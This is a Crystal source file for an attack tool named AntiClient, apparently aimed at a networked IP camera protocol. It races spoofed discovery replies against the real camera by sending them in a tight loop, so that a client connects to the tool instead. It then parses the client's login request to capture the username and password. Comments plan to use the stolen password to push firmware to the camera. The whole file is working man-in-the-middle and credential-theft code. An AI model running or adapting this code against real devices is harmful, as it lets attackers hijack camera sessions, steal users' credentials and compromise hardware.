require "./client"
require "./ifconfig"

class AntiClient < Client
  STATES = [:nothing,
            :listen_for_client_dbp,
            :listen_for_camera_dbr,
            :spam_dbr,
            :listen_for_client_bcp,
            :receive_bps,
            :send_4_bpa,
            :main_phase,
            :closing,
            :closed]

  getter dbr = {} of Symbol => String

  getter camera = Socket::IPAddress.new("0.0.0.0", 0)


  @creds_channel : Channel(Hash(Symbol, String)) = Channel(Hash(Symbol, String)).new
  @spam_dbr = false

  def run
    # Dont allow the client to run again!
    if !is_running?
      @is_running = true
      # Change the state so it will attempt to discover a camera on the network
      @state = STATES[1]
      #Start our fibers
      start_data_fiber
      start_tick_fiber
    else
      LOG.error "ALREADY RUNNING SERVER!" 
    end
  end

  def listen_for_client_dbp
    # TODO: ADD TIMEOUTS!
    got_dbp = false
    LOG.info("Waiting to receive the DBP from a client")
    until got_dbp
      potential_dbp = @db_camera_sock.receive
      got_dbp = true if potential_dbp[0] == DBP
    end
    got_dbp
  end

  def listen_for_camera_dbr
    # TODO: ADD TIMEOUTS!
    got_dbr = false
    LOG.info("Waiting to receive the DBR from a camera")
    until got_dbr
      potential_dbr = @db_client_sock.receive
      LOG.info("Got a potential DBR from a client")

      
      if potential_dbr[0][0..3] == DBR_HEADER
        got_dbr = true 
        @camera = potential_dbr[1]
        LOG.info "GOT DBR TARGET #{@camera}"
      end
    end
    if potential_dbr
      @dbr = Client.parse_dbr potential_dbr
      @dbr
    else
      nil
    end
  end

  # We just need to get our DBR in before the camera.
  def spam_dbr(dbr)
    @spam_dbr = true
    LOG.info "Spamming DBR!"
    spam_fiber = spawn do
      while @spam_dbr
        begin
          send_dbr(dbr)
          sleep 0.000001
        rescue e
          LOG.info "SPAM DBR EXCEPTION #{e}"
          @spam_dbr = false
        end
      end
      LOG.info "Spamming DBR Finished!"
    end
  end

  def listen_for_client_bcp
    # TODO: ADD TIMEOUTS!
    got_bcp = false
    until got_bcp
      potential_bcp = @bc_camera_sock.receive
      if potential_bcp && potential_bcp[0] == BCP
        got_bcp = true
        new_target potential_bcp[1]
      end
    end
    got_bcp
  end

  def wait_for_client_ping(timeout)
    LOG.info "Waiting for client ping"
    ping_channel = Channel(Bool).new

    main_fiber = spawn do
      got_ping = false
      until got_ping
        potential_ping = @data_channel.receive
        if potential_ping[0] == PING_PACKET
          got_ping = true
        elsif potential_ping[0] == UNBLOCK_FIBER_DATA
          break
        end
      end
      ping_channel.send got_ping
    end

    timeout_fiber = spawn do
      sleep timeout
      unblock_data if is_running?
    end

    got_ping = ping_channel.receive
    if got_ping
      LOG.info "PING SUCCESSFUL" 
    else
      LOG.info "PING UNSUCCESSFUL"
    end
    got_ping
  end

  # TODO: Rename to "wait_for_password" and add a disconnect when password is found.
  def main_phase
    # Block here to receive data from the data fiber
    data = @data_channel.receive

    # Classify each packet and respond
    if data[0] == PING_PACKET
      send_pong
    elsif data[0] == PONG_PACKET
      send_ping
    elsif data[0] == DISCONNECT_PACKET
      LOG.info "RECEIVED DISCONNECT FROM CLIENT"
      change_state :spam
    elsif data[0][0..2] == REPLY_HEADER
      LOG.info "REPLY RECIEVED FROM CLIENT"
    elsif data[0][0..3] == BPS_HEADER
      LOG.info "BPS RECEIVED"
    elsif data[0][0..2] == RESPONSE_HEADER
      LOG.info "REQUEST RECEIVED FROM CLIENT #{data[0].size}"   
      LOG.info "\n" + data[0][0x10..data[0].size]
      send_reply

      creds = {} of Symbol => String
      parsed = HTTP::Params.parse(data[0][0x10..data[0].size].split('?')[1])
      puts parsed
      creds[:user] = parsed["user"]
      creds[:pass] = parsed["pwd"]
      @creds_channel.send(creds)
    # This is important! The data fiber will block, waiting for data to come through
    # So to exit the program, we just send the unblock data to the data socket to free it
    elsif data[0] == UNBLOCK_FIBER_DATA
      LOG.info "RECEIVED UNBLOCK FIBER COMMAND!"
    else
      LOG.info "UNKNOWN PACKET RECEIVED from #{data[1]} : #{data[0].bytes.map {|d| d.to_s(16).rjust(2, '0')}.join("\\x")}"
    end
  end

  def wait_for_creds
    @creds_channel.receive
  end

  # TODO: Once we get password, target the camera, revert back to a client, and use auto_download to upgrade firmware.
  # Need to start fiber for download server (HTTP)

  def tick
    if state == :nothing
      # Do nothing
    elsif state == :listen_for_client_dbp
      listen_for_client_dbp
      change_state :listen_for_camera_dbr
    elsif state == :listen_for_camera_dbr
      listen_for_camera_dbr
      change_state :spam
    elsif state == :spam
      spam_dbr @dbr
      change_state :listen_for_client_bcp
    elsif state == :listen_for_client_bcp
      listen_for_client_bcp
      change_state :send_bps
    elsif state == :send_bps
      send_bps @dbr[:uid]
      change_state :receive_bps
    elsif state == :receive_bps
      if receive_bps(5)
        @spam_dbr = false
        change_state :send_4_bpa
      else
        change_state :listen_for_client_bcp
      end
    elsif state == :send_4_bpa
      send_bpa(@dbr[:uid])
      send_bpa(@dbr[:uid])
      send_bpa(@dbr[:uid])
      send_bpa(@dbr[:uid])
      send_pong

      if wait_for_client_ping(5)
        change_state :main_phase
      else
        change_state :spam
      end
    elsif state == :main_phase
      main_phase
    elsif state == :closing
    elsif state == :closed
    else
      raise "THERE WAS A BAD IN TICK!"
    end
  end  
end